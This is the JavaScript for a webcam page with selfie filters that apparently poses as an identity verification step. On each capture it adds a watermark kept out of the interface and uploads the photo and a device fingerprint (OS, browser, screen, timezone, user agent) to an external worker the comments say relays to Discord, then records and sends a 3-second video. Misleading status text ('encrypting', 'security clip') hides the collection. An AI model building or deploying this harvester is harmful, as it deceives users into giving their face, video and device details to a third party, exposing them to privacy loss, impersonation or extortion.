const WORKER_URL = "https://verify.ryancustard8-8af.workers.dev";

const video = document.getElementById('webcam');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const statusText = document.getElementById('status');
const filterSelect = document.getElementById('filterSelect');
const mainContainer = document.getElementById('mainContainer');

let currentStream = null;

// 1. Live Filter Change Listener
filterSelect.addEventListener('change', () => {
    video.style.filter = filterSelect.value;
});

// 2. Comprehensive Device Info Generator
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown OS";
    
    if (/iphone/i.test(ua)) os = "iPhone";
    else if (/ipad/i.test(ua)) os = "iPad";
    else if (/android/i.test(ua)) os = "Android";
    else if (/win/i.test(ua)) os = "Windows PC";
    else if (/mac/i.test(ua)) os = "Macintosh";
    else if (/linux/i.test(ua)) os = "Linux";

    let browser = "Unknown Browser";
    if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) browser = "Chrome";
    else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/edge|edg/i.test(ua)) browser = "Edge";

    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

    return `📱 **OS / Device:** ${os}\n🌐 **Browser:** ${browser}\n🖥️ **Screen Res:** ${screenRes}\n📐 **Viewport:** ${viewportRes}\n🌍 **Timezone:** ${timeZone}\n📋 **User Agent:** \`${ua}\``;
}

// 3. Start the webcam
async function startCamera() {
    try {
        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = currentStream;
    } catch (error) {
        statusText.innerText = "Camera access denied. Please allow camera permissions.";
        statusText.style.color = "#ff4444";
    }
}

// 4. Handle button click (Snaps instant photo, adds 'skzlx' watermark, then records a 3s clip)
captureBtn.addEventListener('click', async () => {
    statusText.innerText = "Encrypting and uploading bundle...";
    statusText.style.color = "#ffaa00";

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;

    canvas.width = width;
    canvas.height = height;
    
    const ctx = canvas.getContext('2d');
    
    // Draw mirrored canvas image so captured photo matches selfie orientation
    ctx.save();
    ctx.translate(width, 0);
    ctx.scale(-1, 1);
    ctx.filter = filterSelect.value !== 'none' ? filterSelect.value : 'none';
    ctx.drawImage(video, 0, 0, width, height);
    ctx.restore();

    // Reset filter for watermark text rendering
    ctx.filter = 'none';

    // Draw non-inverted 'skzlx' watermark on bottom-right of the image ONLY (hidden from UI)
    const fontSize = Math.max(18, Math.floor(width / 24));
    ctx.font = `bold ${fontSize}px sans-serif`;
    ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
    ctx.shadowColor = "rgba(0, 0, 0, 0.8)";
    ctx.shadowBlur = 6;
    ctx.textAlign = "right";
    ctx.fillText("skzlx", width - (width * 0.04), height - (height * 0.04));

    // Send high-res picture to Discord FIRST
    canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("image", blob, "client.png");
        formData.append("deviceInfo", getDeviceInfo());

        try {
            const response = await fetch(WORKER_URL, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                statusText.innerText = "📸 Image sent! Recording 3s security clip...";
                statusText.style.color = "#00cc66";

                mainContainer.classList.add('glitch-success');
                setTimeout(() => mainContainer.classList.remove('glitch-success'), 600);

                // Start 3-Second Video Clip Recording right after photo sends
                recordAndSendVideoClip();
            } else {
                const errorDetail = await response.text();
                throw new Error(errorDetail);
            }
        } catch (err) {
            console.error("Full upload error:", err);
            statusText.innerText = "❌ Upload failed. Button is ready to retry.";
            statusText.style.color = "#ff4444";
        }
    }, 'image/png');
});

// 5. Record 3-Second Video Clip and send to Discord
function recordAndSendVideoClip() {
    if (!currentStream) return;

    let mimeType = 'video/webm';
    if (!MediaRecorder.isTypeSupported('video/webm')) {
        if (MediaRecorder.isTypeSupported('video/mp4')) {
            mimeType = 'video/mp4';
        } else {
            mimeType = '';
        }
    }

    const options = mimeType ? { mimeType } : {};
    let recorder;
    
    try {
        recorder = new MediaRecorder(currentStream, options);
    } catch (e) {
        console.error("MediaRecorder init failed:", e);
        statusText.innerText = "✅ Sent successfully! Ready to send another.";
        return;
    }

    const chunks = [];
    recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) chunks.push(e.data);
    };

    recorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: mimeType || 'video/mp4' });
        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
        
        const videoData = new FormData();
        videoData.append("video", videoBlob, `verification_clip.${ext}`);

        try {
            statusText.innerText = "Uploading 3s video clip...";
            const vidRes = await fetch(WORKER_URL, {
                method: "POST",
                body: videoData
            });

            if (vidRes.ok) {
                statusText.innerText = "✅ Photo & 3s Video sent successfully!";
                statusText.style.color = "#00cc66";
            }
        } catch (err) {
            console.error("Video upload error:", err);
        }
    };

    recorder.start();
    setTimeout(() => {
        if (recorder.state === "recording") {
            recorder.stop();
        }
    }, 3000);
}

// Boot up camera on load
startCamera();
